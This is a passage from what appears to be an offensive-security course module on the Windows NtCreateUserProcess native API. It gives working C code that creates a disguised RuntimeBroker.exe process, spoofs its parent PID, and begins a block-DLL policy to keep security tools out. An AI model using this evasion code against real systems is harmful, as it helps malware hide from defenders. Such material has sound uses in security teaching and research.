</code></pre><h3 id="82e88566-d006-4162-a4ae-1b8f973bda68" class=""><strong>Initializing PS_ATTRIBUTE_LIST</strong></h3><p id="7a5946a6-247b-40a1-83b6-f9270e9eb9bd" class="">In the code snippet below, the <code>PS_ATTRIBUTE_IMAGE_NAME</code> flag is used as the first attribute in the <code>PS_ATTRIBUTE_LIST</code> structure, <code>pAttributeList</code>. This flag represents the attribute that will hold the name of the process. By setting this attribute, the <code>NtCreateUserProcess</code> function is informed about which image to execute, which in this case is specified with the <code>szProcessName</code> variable.</p><pre id="7a0e62a6-b3a7-4c6b-a9fb-d4f653c062b5" class="code code-wrap"><code>PPS_ATTRIBUTE_LIST  pAttributeList          = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
if (!pAttributeList)
    return FALSE;

// this is always set to the size of the &#x27;PS_ATTRIBUTE_LIST&#x27; structure
pAttributeList-&gt;TotalLength                 = sizeof(PS_ATTRIBUTE_LIST);

// the type of the attribute
pAttributeList-&gt;Attributes[0].Attribute     = PS_ATTRIBUTE_IMAGE_NAME;
// the size of the attribute value
pAttributeList-&gt;Attributes[0].Size          = dwProcessNameLength;
// the attribute value
pAttributeList-&gt;Attributes[0].Value         = szProcessName;
</code></pre><h3 id="56e872dd-3863-4da9-be7b-915a36a06b10" class=""><strong>Initializing Additional Attributes</strong></h3><p id="81334b73-3f7e-43e7-857a-5ef16a773012" class="">To initialize additional attributes, update the number of elements in the <code>Attributes</code> array.</p><pre id="70ee4c21-4032-430b-8c09-e39acc49e4df" class="code code-wrap"><code>typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[2];       // updated to fit an additional attribute
    // PS_ATTRIBUTE Attributes[3];    // updated to fit 3 attributes

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre><h3 id="833031fa-6916-4555-9939-e333cad9193c" class=""><strong>PS_CREATE_INFO CreateInfo</strong></h3><p id="356613d4-4a42-4777-b276-f72d54aff1b4" class=""><code>NtCreateUserProcess</code>&#x27;s 10th parameter, <code>CreateInfo</code>, is an input and output parameter and a pointer to the <code>PS_CREATE_INFO</code> structure.</p><pre id="b73daa6b-a7bf-45f3-8488-b8988fa55f89" class="code code-wrap"><code>typedef struct _PS_CREATE_INFO
{
	SIZE_T Size;
	PS_CREATE_STATE State;
	union
	{
		struct
		{
			union
			{
				ULONG InitFlags;
				struct
				{
					UCHAR WriteOutputOnExit : 1;
					UCHAR DetectManifest : 1;
					UCHAR IFEOSkipDebugger : 1;
					UCHAR IFEODoNotPropagateKeyState : 1;
					UCHAR SpareBits1 : 4;
					UCHAR SpareBits2 : 8;
					USHORT ProhibitedImageCharacteristics : 16;
				} s1;
			} u1;
			ACCESS_MASK AdditionalFileAccess;
		} InitState;

		struct
		{
			HANDLE FileHandle;
		} FailSection;

		struct
		{
			USHORT DllCharacteristics;
		} ExeFormat;

		struct
		{
			HANDLE IFEOKey;
		} ExeName;

		struct
		{
			union
			{
				ULONG OutputFlags;
				struct
				{
					UCHAR ProtectedProcess : 1;
					UCHAR AddressSpaceOverride : 1;
					UCHAR DevOverrideEnabled : 1;
					UCHAR ManifestDetected : 1;
					UCHAR ProtectedProcessLight : 1;
					UCHAR SpareBits1 : 3;
					UCHAR SpareBits2 : 8;
					USHORT SpareBits3 : 16;
				} s2;
			} u2;
			HANDLE FileHandle;
			HANDLE SectionHandle;
			ULONGLONG UserProcessParametersNative;
			ULONG UserProcessParametersWow64;
			ULONG CurrentParameterFlags;
			ULONGLONG PebAddressNative;
			ULONG PebAddressWow64;
			ULONGLONG ManifestAddress;
			ULONG ManifestSize;
		} SuccessState;
	};

} PS_CREATE_INFO, * PPS_CREATE_INFO;
</code></pre><h3 id="e95f9a1e-c461-404a-aa46-35a6e6e33d92" class=""><strong>Initializing PS_CREATE_INFO</strong></h3><p id="34f13292-cfc9-4a02-998a-72dcd9287b0a" class="">While the <code>PS_CREATE_INFO</code> structure is large, most of its elements are set by <code>NtCreateUserProcess</code> when it&#x27;s executed successfully. The only elements that should be initialized before passing the structure to <code>NtCreateUserProcess</code> are the <code>Size</code> and <code>State</code> elements as shown below.</p><pre id="4758eb03-b630-4bf1-b7e6-3d7551c566dc" class="code code-wrap"><code>PS_CREATE_INFO CreateInfo = { 0 };

CreateInfo.Size  = sizeof(PS_CREATE_INFO);
CreateInfo.State = PsCreateInitialState;
</code></pre><p id="0efc2f47-58f6-477a-a195-ed1828e92ed6" class="">The value of the <code>State</code> element is derived from the enumeration below. However, in almost all cases, it is set to <code>PsCreateInitialState</code>.</p><pre id="d904b4bd-094f-45bb-9bce-03a867a87707" class="code code-wrap"><code>typedef enum _PS_CREATE_STATE
{
	PsCreateInitialState,
	PsCreateFailOnFileOpen,
	PsCreateFailOnSectionCreate,
	PsCreateFailExeFormat,
	PsCreateFailMachineMismatch,
	PsCreateFailExeName,
	PsCreateSuccess,
	PsCreateMaximumStates

} PS_CREATE_STATE;
</code></pre><h3 id="f68ad331-0abb-4089-8e78-ec650b4e31f1" class=""><strong>RTL_USER_PROCESS_PARAMETERS ProcessParameters</strong></h3><p id="4a97f975-ae00-4be6-a500-8a4752469b1d" class="">Although the <code>ProcessParameters</code> parameter is designated as an optional parameter, setting it to <code>NULL</code> will result in <code>NtCreateUserProcess</code> failing with <code>0xC0000005</code> or <code>STATUS_ACCESS_VIOLATION</code>. The <code>RTL_USER_PROCESS_PARAMETERS</code> structure is poorly documented by <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters">Microsoft</a> and therefore the structure was retrieved from the <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2635">Process Hacker repository</a>.</p><pre id="79d3e0b4-ad5d-4ccd-9b6a-b2fd010318dd" class="code code-wrap"><code>typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PWCHAR Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG_PTR EnvironmentSize;
	ULONG_PTR EnvironmentVersion;
	PVOID PackageDependencyData;
	ULONG ProcessGroupId;
	ULONG LoaderThreads;

} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
</code></pre><h3 id="a0cb4754-4f55-4c32-a28a-74b8a94bce51" class=""><strong>Initilizaing RTL_USER_PROCESS_PARAMETERS</strong></h3><p id="bc871e76-b0d7-4471-8a29-abe09db67552" class="">To initialize the <code>RTL_USER_PROCESS_PARAMETERS</code> structure, the <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2722">RtlCreateProcessParametersEx</a> native function is used.</p><pre id="90f44ca5-df79-46b8-9dce-dd8fb45f4d43" class="code code-wrap"><code>RtlCreateProcessParametersEx(
    OUT 	PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    IN 		PUNICODE_STRING ImagePathName,
    IN OPTIONAL PUNICODE_STRING DllPath,         // set to NULL
    IN OPTIONAL PUNICODE_STRING CurrentDirectory,
    IN OPTIONAL PUNICODE_STRING CommandLine,
    IN OPTIONAL PVOID Environment,              // set to NULL
    IN OPTIONAL PUNICODE_STRING WindowTitle,    // set to NULL
    IN OPTIONAL PUNICODE_STRING DesktopInfo,    // set to NULL
    IN OPTIONAL PUNICODE_STRING ShellInfo,      // set to NULL
    IN OPTIONAL PUNICODE_STRING RuntimeData,    // set to NULL
    IN ULONG Flags
);
</code></pre><p id="1f0969cb-f4f4-4da9-9754-829a38bd54ce" class="">The majority of the parameters are optional and can be set to <code>NULL</code>. The important parameters are explained below.</p><ul id="41d8e8f7-27fa-44e2-b1e9-a4d89f47064b" class="bulleted-list"><li style="list-style-type:disc"><code>pProcessParameters</code> - A pointer to the <code>PRTL_USER_PROCESS_PARAMETERS</code> structure. This is the output of <code>RtlCreateProcessParametersEx</code>.</li></ul><ul id="e44ff585-5259-4b6e-9025-24c82f825124" class="bulleted-list"><li style="list-style-type:disc"><code>ImagePathName</code> - A pointer to a <code>UNICODE_STRING</code> structure that holds the complete path of the image file used to create the process. The provided image path must be in <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c">NT path format</a>. For example, to create <code>C:\\Windows\\System32\\cmd.exe</code>, the path should be prefixed with <code>\\??\\</code> making it <code>\\??\\C:\\Windows\\System32\\cmd.exe</code>. This parameter is shown using Process Hacker in the image below.<figure id="776a61aa-eb1b-4c9d-9777-0821c0fa8f55" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-219843832-69179def-33c9-4145-a2cc-5b876df3d410.png"><img style="width:1272px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-219843832-69179def-33c9-4145-a2cc-5b876df3d410.png"/></a></figure><p id="ff7e9cab-5e8a-4493-8c60-b80662408fc1" class="">• <code>CurrentDirectory</code> - A pointer to a <code>UNICODE_STRING</code> structure that holds the current directory path of the created process. This parameter is shown using Process Hacker in the image below.</p><figure id="1a7b7c76-9cdd-41d9-be88-023402896dca" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-319843814-83b44231-2b26-4236-8764-c0aab559838d.png"><img style="width:1272px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-319843814-83b44231-2b26-4236-8764-c0aab559838d.png"/></a></figure><p id="322e801c-55e2-48de-a030-4d2eef2a5b23" class="">• <code>CommandLine</code> - A pointer to a <code>UNICODE_STRING</code> structure that holds the arguments for the created process. This parameter is shown using Process Hacker in the image below.</p><figure id="df4c3dbf-0ae4-45e9-856c-d98328ab0d34" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-419843782-b85fa358-4019-49dd-856f-605170af0661.png"><img style="width:1272px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-419843782-b85fa358-4019-49dd-856f-605170af0661.png"/></a></figure><ul id="f357a230-c6ee-421f-9998-3c2a26c9ddcb" class="bulleted-list"><li style="list-style-type:circle"><code>Flags</code> - This is set to <code>RTL_USER_PROC_PARAMS_NORMALIZED</code> to keep parameters normalized as per Process Hacker&#x27;s <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2733">note</a>. With that being said, <code>Flags</code> can be set to any of the values below.</li></ul><pre id="61ee9059-e138-463a-8343-b5708e06efce" class="code code-wrap"><code>#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001      // indicates that the parameters passed to the process are already in a normalized form#define RTL_USER_PROC_PROFILE_USER 0x00000002           // enables user-mode profiling for the process#define RTL_USER_PROC_PROFILE_KERNEL 0x00000004         // enables kernel-mode profiling for the process#define RTL_USER_PROC_PROFILE_SERVER 0x00000008         // enables server-mode profiling for the process#define RTL_USER_PROC_RESERVE_1MB 0x00000020            // reserves 1 megabyte (MB) of virtual address space for the process#define RTL_USER_PROC_RESERVE_16MB 0x00000040           // reserves 16 MB of virtual address space for the process#define RTL_USER_PROC_CASE_SENSITIVE 0x00000080         // sets the process to be case-sensitive#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100  // disables heap decommitting for the process#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000  // enables local DLL redirection for the process#define RTL_USER_PROC_APP_MANIFEST_PRESENT 0x00002000   // indicates that an application manifest is present for the process#define RTL_USER_PROC_IMAGE_KEY_MISSING 0x00004000      // indicates that the image key is missing for the process#define RTL_USER_PROC_OPTIN_PROCESS 0x00020000          // indicates that the process has opted in to some specific behavior or feature</code></pre><h3 id="abdb38a1-3ec8-4e08-a987-2ae1af2d4586" class=""><strong>Creating a Process Using NtCreateUserProcess</strong></h3><p id="7e65ce01-3862-40a4-b33b-9b3dfe7a6bf8" class="">Now that <code>NtCreateUserProcess</code> has been thoroughly explained, this section will demonstrate the usage of the function to create a process via the custom function <code>NtCreateUserProcessMinimalPoC</code>. Note that <code>PS_ATTRIBUTE_LIST</code> only requires one attribute as shown below.</p><pre id="ab81a57b-1753-43f8-a8d7-d619af530d05" class="code code-wrap"><code>typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1]; // 1 attribute

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre><pre id="f61d08c9-f2b6-48c7-89ee-d86fddc749c9" class="code code-wrap"><code>BOOL NtCreateUserProcessMinimalPoC(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {

	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                    = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
	pAttributeList-&gt;Attributes[0].Attribute        = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size             = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value            = (ULONG_PTR)UsNtImagePath.Buffer;

	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo = {
					.Size  = sizeof(PS_CREATE_INFO),
					.State = PsCreateInitialState
	};

	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}

_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre><h3 id="00bfa026-65e8-486b-9e0e-bb541846450c" class=""><strong>Custom RtlInitUnicodeString</strong></h3><p id="2c8217df-c4a9-47fe-a829-3b5bd70d60be" class="">The <code>_RtlInitUnicodeString</code> function initializes a <code>UNICODE_STRING</code> structure with the provided wide string. Note that <code>_RtlInitUnicodeString</code> is a custom replacement function of the real one, that is <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitunicodestring">RtlInitUnicodeString</a>.</p><pre id="b94405f7-7dc6-49b6-bd4e-64d75a1237dd" class="code code-wrap"><code>VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct-&gt;Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length &gt; 0xfffc)
			Length = 0xfffc;

		UsStruct-&gt;Length = Length;
		UsStruct-&gt;MaximumLength = UsStruct-&gt;Length + sizeof(WCHAR);
	}

	else UsStruct-&gt;Length = UsStruct-&gt;MaximumLength = 0;
}
</code></pre><p id="fd76964f-1c81-4e65-af9c-cfb17fd3c892" class="">The second if-statement in the above function is to check if the calculated length (in bytes) is greater than the maximum size allowed for a <code>UNICODE_STRING</code> structure (<code>0xfffc</code>). If that&#x27;s the case, the length is capped at the maximum size. Besides that, the function initializes the inputted <code>UNICODE_STRING</code>&#x27;s elements with the correct values.</p><h3 id="f72159e1-3e53-4db1-a8f7-26724680190a" class=""><strong>Main Function</strong></h3><p id="c68c61d6-2f84-48f6-a26f-e639967f68f6" class="">Use the main function below to call the <code>NtCreateUserProcessMinimalPoC</code>.</p><pre id="0528ae65-de10-4038-a0fe-216508fb81bb" class="code code-wrap"><code>#define TARGET_PROCESS          L&quot;\\??\\C:\\Windows\\System32\\RuntimeBroker.exe&quot;#define PROCESS_PARMS           L&quot;C:\\Windows\\System32\\RuntimeBroker.exe -Embedding&quot;#define PROCESS_PATH            L&quot;C:\\Windows\\System32&quot;int main() {

  HANDLE	hProcess	= NULL,
		    hThread		= NULL;

  if (!NtCreateUserProcessMinimalPoC(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, &amp;hProcess, &amp;hThread))
	return -1;

  printf(&quot;[+] Target Process Created With Pid : %d \n&quot;, GetProcessId(hProcess));
  printf(&quot;[+] Process&#x27;s Main Thread Created With Tid : %d \n&quot;, GetThreadId(hThread));
  return 0;
}
</code></pre><h3 id="b218f5bd-1fcc-4703-bbe1-4141d5a1b715" class=""><strong>Results</strong></h3><figure id="e77a8ca8-5a03-445a-a80d-5fd5ba26fda4" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-526114852-0ea90178-69cb-4383-98c2-796ffb348451.png"><img style="width:1270px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-526114852-0ea90178-69cb-4383-98c2-796ffb348451.png"/></a></figure><p id="c2e1e487-f9a2-4db7-a52a-7775c6a6f703" class="">Which looks similar to that of a legit RuntimeBroker (except for the parent Process).</p><figure id="42ed2aa6-1732-48f0-a2fe-a66f701d3f07" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-626114907-67b9501b-6e77-42b2-98a1-f7eac8e3021c.png"><img style="width:1107px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-626114907-67b9501b-6e77-42b2-98a1-f7eac8e3021c.png"/></a></figure><h3 id="e8e6dfe1-7e19-4f28-8bf1-e6882ac6f8f8" class=""><strong>PPID Spoofing Using NtCreateUserProcess</strong></h3><p id="668ce46b-d486-4e66-a68e-c463a57006e1" class="">The next usage of <code>NtCreateUserProcess</code> will be for performing PPID spoofing. Note that <code>PS_ATTRIBUTE_LIST</code> needs to be modified to allow an additional attribute as shown below.</p><pre id="e9d3f895-61fa-49de-8bcc-c2b4fb3c85eb" class="code code-wrap"><code>typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[2]; // Increment to 2 for an additional attribute

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre><p id="0e776188-bea5-4584-9f57-2e82e61e6189" class=""><code>NtCreateUserProcessForPPidSpoofing</code> is a custom function that performs PPID spoofing. The function is similar to <code>NtCreateUserProcessMinimalPoC</code>, with the main difference being that the additional attribute uses the <code>PS_ATTRIBUTE_PARENT_PROCESS</code> flag to specify the spoofed parent process.</p><pre id="7c280856-6aba-4fab-b743-6548f4a7a6ce" class="code code-wrap"><code>BOOL NtCreateUserProcessForPPidSpoofing(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	IN      HANDLE  hParentProcess,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {

	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);

	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_PARENT_PROCESS&#x27; that specifies the process&#x27;s parent
	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList-&gt;Attributes[1].Size              = sizeof(HANDLE);
	pAttributeList-&gt;Attributes[1].Value             = hParentProcess;

	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo = {
					.Size	= sizeof(PS_CREATE_INFO),
					.State	= PsCreateInitialState
	};

	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre><h3 id="199169fd-8630-4320-8824-f8efdca21012" class=""><strong>Main Function</strong></h3><p id="8e8eba88-6a0e-40cb-9c85-6ffe32b3188a" class="">The main function below invokes <code>NtCreateUserProcessForPPidSpoofing</code> to perform PPID spoofing.</p><pre id="a6a59e0e-7515-4bf1-bb5d-bf5cffe48c00" class="code code-wrap"><code>#define TARGET_PROCESS          L&quot;\\??\\C:\\Windows\\System32\\RuntimeBroker.exe&quot;#define PROCESS_PARMS           L&quot;C:\\Windows\\System32\\RuntimeBroker.exe -Embedding&quot;#define PROCESS_PATH            L&quot;C:\\Windows\\System32&quot;#define PARENT_PID              4384int main() {

  HANDLE	hProcess	= NULL,
		    hThread		= NULL;

  hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_PID);
  if (!NtCreateUserProcessForPPidSpoofing(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, hParentProcess, &amp;hProcess, &amp;hThread))
	return -1;

  printf(&quot;[+] Target Process Created With Pid : %d \n&quot;, GetProcessId(hProcess));
  printf(&quot;[+] Process&#x27;s Main Thread Created With Tid : %d \n&quot;, GetThreadId(hThread));
  return 0;
}

</code></pre><h3 id="ff558ba0-a393-4a95-b160-c778a83fe040" class=""><strong>Results</strong></h3><p id="4e0f6303-9953-4b62-ba1a-a7d673d727cb" class="">The image below shows a process with a successfully spoofed parent process.</p><figure id="eaca5382-7bb4-4ea6-a098-a4a88168eda4" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-719850092-b93a1079-dfe7-4a3c-9db5-bc00c30df0b6.png"><img style="width:1632px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-719850092-b93a1079-dfe7-4a3c-9db5-bc00c30df0b6.png"/></a></figure><h3 id="fa58f7c4-a193-40be-9330-f0cd6d98b630" class=""><strong>Block DLL Policy Using NtCreateUserProcess</strong></h3><p id="3570d0f1-5dd0-4b3b-a7d8-e41718d99131" class=""><code>NtCreateUserProcess</code> can also be used to enable the block DLL policy, which was introduced in the previous module. The <code>PS_ATTRIBUTE_LIST</code> structure will require two attributes. The additional attribute is set to <code>PS_ATTRIBUTE_MITIGATION_OPTIONS</code> which specifies the process mitigation options to use for the new process.</p><p id="5a3849f9-72ce-438a-b134-7fe9c252c829" class=""><code>NtCreateUserProcessForBlockDllPolicy</code> is a custom function that enables the mitigation policy to block non-Microsoft signed DLLs.</p><pre id="3b5e8174-cb37-44a3-a313-8a6276c8ad01" class="code code-wrap"><code>BOOL NtCreateUserProcessForBlockDllPolicy(
	IN      PWSTR   szTargetProcess,
	IN      PWSTR   szTargetProcessParameters,
	IN      PWSTR   szTargetProcessPath,
	OUT     PHANDLE hProcess,
	OUT     PHANDLE hThread
) {

	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS                        STATUS                      = NULL;
	UNICODE_STRING                  UsNtImagePath               = { 0 },
                                    UsCommandLine               = { 0 },
                                    UsCurrentDirectory          = { 0 };
	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
	// the mitigation policy flag (attribute value)
	DWORD64                         dwBlockDllPolicy            = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	// allocating a buffer to hold the value of the attribute lists
